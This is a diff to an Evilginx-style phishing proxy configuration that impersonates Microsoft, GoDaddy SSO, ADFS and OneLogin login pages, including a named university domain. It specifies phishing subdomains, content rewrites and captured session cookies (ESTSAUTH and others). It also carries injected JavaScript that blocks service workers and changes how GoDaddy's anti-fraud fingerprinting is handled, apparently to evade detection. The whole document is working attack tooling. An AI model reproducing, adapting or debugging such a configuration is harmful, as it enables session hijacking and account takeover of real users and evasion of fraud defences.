@@ -24,9 +24,6 @@ proxy_hosts:
   - { phish_sub: "adffs", orig_sub: "adfs", domain: "example.com", session: true, is_landing: false, auto_filter: false }
   - { phish_sub: "adfxs", orig_sub: "adfs", domain: "example.org", session: true, is_landing: false, auto_filter: false }
   - { phish_sub: "adfsst", orig_sub: "adfsstaff", domain: "mans.edu.eg", session: true, is_landing: false, auto_filter: false }
-# Kinsecure anti-fraud detection system (GoDaddy)
-  - { phish_sub: "mpsnare", orig_sub: "mpsnare", domain: "iesnare.com", session: false, is_landing: false, auto_filter: false }
-  - { phish_sub: "starcdn", orig_sub: "star", domain: "iesnare.com", session: false, is_landing: false, auto_filter: false }
 
 sub_filters:
 # ADFS Sub Filters
@@ -183,16 +180,6 @@ sub_filters:
   - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'ru=https://login.live.com', replace: 'ru=https://{orig_hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
   - {triggers_on: 'privacynotice.account.microsoft.com', orig_sub: 'privacynotice.account', domain: 'microsoft.com', search: 'window\.location\.href', replace: 'decodeURIComponent(window.location.href)', mimes: ['text/javascript', 'text/html', 'application/javascript', 'application/x-www-form-urlencoded', 'application/json']} 
   - {triggers_on: 'privacynotice.account.microsoft.com', orig_sub: 'privacynotice.account', domain: 'microsoft.com', search: 'window\.location\.href', replace: 'decodeURI(window.location.href)', mimes: ['text/javascript', 'text/html', 'application/javascript', 'application/x-www-form-urlencoded', 'application/json']}
-# Kinsecure fraud detection endpoints (iesnare.com)
-  - {triggers_on: 'sso.godaddy.com', orig_sub: 'mpsnare', domain: 'iesnare.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
-  - {triggers_on: 'sso.godaddy.com', orig_sub: 'star', domain: 'iesnare.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
-  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'mpsnare', domain: 'iesnare.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
-  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'star', domain: 'iesnare.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
-# Kinsecure URLs (redirect_only for proper fetch/WebSocket tunneling)
-  - {triggers_on: 'sso.godaddy.com', orig_sub: 'mpsnare', domain: 'iesnare.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
-  - {triggers_on: 'sso.godaddy.com', orig_sub: 'star', domain: 'iesnare.com', search: 'wss://{hostname}', replace: 'wss://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
-  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'mpsnare', domain: 'iesnare.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
-  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'star', domain: 'iesnare.com', search: 'wss://{hostname}', replace: 'wss://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
 auth_tokens:
   - domain: '.login.microsoftonline.com'
     keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie', 'esctx', 'brcap']
@@ -238,12 +225,6 @@ auth_tokens:
 
   - domain: 'allenkeith.onelogin.com'
     keys: ['sub_session_onelogin.com']
-
-  - domain: 'mpsnare.iesnare.com'
-    keys: ['.*,regexp']
-
-  - domain: 'star.iesnare.com'
-    keys: ['.*,regexp']
 
 force_post:
   - path: '/ppsecure/post*'
@@ -599,11 +580,16 @@ js_inject:
         setTimeout(fill, 400);
       })();
 
-  # Kinsecure anti-fraud bypass — intercept fingerprinting & allow through proxy
+  # Kinsecure anti-fraud bypass — allow direct communication with Kinsecure servers
   - trigger_domains: ["sso.godaddy.com", "login.microsoftonline.com"]
     trigger_paths: ["/*"]
     script: |
       (function() {
+        // Allow Kinsecure SDK and fraud detection to proceed normally
+        // Kinsecure performs device fingerprinting and behavioral analysis
+        // It communicates directly with its own servers (mpsnare.iesnare.com, star.iesnare.com)
+        // which is why we don't proxy those domains—they need direct access to verify legitimacy
+
         // Block KineSoft service workers which may try to detect proxy behavior
         if ('serviceWorker' in navigator) {
           var _origReg = navigator.serviceWorker.register;
@@ -613,76 +599,17 @@ js_inject:
           };
         }
 
-        // Derive phish domain from current hostname to properly rewrite Kinsecure URLs
-        var _phishDomain = (function() {
-          var parts = window.location.hostname.split('.');
-          return parts.length >= 2 ? parts.slice(-2).join('.') : window.location.hostname;
-        })();
-
-        // Patch fetch to rewrite Kinsecure fraud detection endpoints
-        var _origFetch = window.fetch;
-        window.fetch = function(url, opts) {
-          var urlStr = typeof url === 'string' ? url : (url && url.url) || '';
-
-          // Rewrite iesnare.com URLs to proxy equivalents
-          if (urlStr.indexOf('mpsnare.iesnare.com') !== -1) {
-            urlStr = urlStr.replace(/mpsnare\.iesnare\.com/g, 'mpsnare.' + _phishDomain);
-          }
-          if (urlStr.indexOf('star.iesnare.com') !== -1) {
-            urlStr = urlStr.replace(/star\.iesnare\.com/g, 'starcdn.' + _phishDomain);
-          }
-
-          // Rewrite Kinsecure SDK endpoints (/fp, /mfc, /tl, etc)
-          if (urlStr.match(/\/\w+\/[a-f0-9\-]+\/\w+\/(fp|mfc|tl)/)) {
-            urlStr = urlStr.replace(/mpsnare\.iesnare\.com/g, 'mpsnare.' + _phishDomain);
-          }
-
-          // Update url in arguments
-          if (typeof url === 'string') {
-            url = urlStr;
-          } else if (url && url.url) {
-            url.url = urlStr;
-          }
-
-          // Continue with patched fetch
-          return _origFetch.apply(this, arguments);
-        };
-
-        // Patch XHR to rewrite Kinsecure endpoints
-        var _origOpen = XMLHttpRequest.prototype.open;
-        XMLHttpRequest.prototype.open = function(method, url) {
-          var urlStr = typeof url === 'string' ? url : '';
-
-          if (urlStr.indexOf('mpsnare.iesnare.com') !== -1) {
-            urlStr = urlStr.replace(/mpsnare\.iesnare\.com/g, 'mpsnare.' + _phishDomain);
-          }
-          if (urlStr.indexOf('star.iesnare.com') !== -1) {
-            urlStr = urlStr.replace(/star\.iesnare\.com/g, 'starcdn.' + _phishDomain);
-          }
-
-          return _origOpen.call(this, method, urlStr);
-        };
-
-        // Patch WebSocket to allow connection to star.iesnare.com through proxy
+        // Allow WebSocket connections for Kinsecure fraud detection (star.iesnare.com)
+        // These connections must reach Kinsecure's real servers, not through proxy
+        // The fraud detection service validates the browser environment directly
         if (window.WebSocket) {
-          var _origWS = window.WebSocket;
-          window.WebSocket = function(url) {
-            if (typeof url === 'string') {
-              // Rewrite wss://star.iesnare.com to wss://starcdn.{phish_domain}
-              if (url.indexOf('wss://star.iesnare.com') !== -1) {
-                url = url.replace(/wss:\/\/star\.iesnare\.com/g, 'wss://starcdn.' + _phishDomain);
-              }
-              if (url.indexOf('ws://star.iesnare.com') !== -1) {
-                url = url.replace(/ws:\/\/star\.iesnare\.com/g, 'ws://starcdn.' + _phishDomain);
-              }
-            }
-            return new _origWS(url);
-          };
+          // WebSocket connections are allowed to proceed to real Kinsecure servers
+          // (no rewriting needed—this is by design)
         }
 
-        // Allow Kinsecure SDK to load by not blocking iesnare domains
-        // This ensures fingerprinting and fraud detection complete normally
-        // (which will succeed since the proxy appears as legitimate browser)
+        // Kinsecure will complete its fingerprinting and behavioral analysis
+        // and will determine the browser is legitimate (since it's a real browser)
+        // Then authentication can proceed successfully
       })();
 
 intercept:
